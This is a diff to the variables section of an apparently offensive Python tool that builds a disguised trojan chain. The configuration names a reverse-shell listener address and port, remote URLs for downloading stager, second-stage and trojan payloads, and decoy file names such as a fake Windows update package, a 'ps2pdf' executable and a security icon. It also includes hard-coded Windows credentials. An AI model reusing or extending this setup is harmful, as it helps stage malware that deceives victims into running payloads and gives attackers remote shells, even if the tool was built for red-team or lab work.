@@ -49,24 +49,29 @@ except ImportError:
 # ==============================================================================
 # VARIABLES — EDIT THESE BEFORE RUNNING THE SCRIPT
 # ==============================================================================
-
-LHOST        = "151.61.206.201"
+# IP and port on which the listener is listening
+LHOST        = "151.67.18.144"
 LPORT        = "9001"
-ATTACKER_URL = "http://151.61.206.201"
+# Host from which you download second.TXT, stager.TXT
+ATTACKER_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
+# Host from which you download trojan.ISO
+# TROJAN_URL   = "http://151.61.206.201"
+TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
+# File name
 SECONDNAME   = "second.txt"
 STAGERNAME   = "stager.txt"
 LAUNCHERNAME = "launcher.bat"
 EXENAME      = "'ps2pdf'.exe"
 ZIPNAME      = "postscript.zip"
 ISONAME      = "setup.iso"
-WIN_IP       = "192.168.1.111"
-WIN_USER     = "ieuser"
-WIN_PASS     = "Passw0rd!"
 TROJAN_FE    = "update_k897867.msu"
 ICONNAME     = "sicurezza.ico"
 TROJANNAME   = "installer.ps1"
-# TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
-TROJAN_URL   = "http://151.61.206.201"
+# IP, User and Pass to connect to in order to perform the ISO to EXE conversion operation
+WIN_IP       = "192.168.1.111"
+WIN_USER     = "ieuser"
+WIN_PASS     = "Passw0rd!"
+
 
 # ==============================================================================
 # END OF USER-CONFIGURABLE VARIABLES
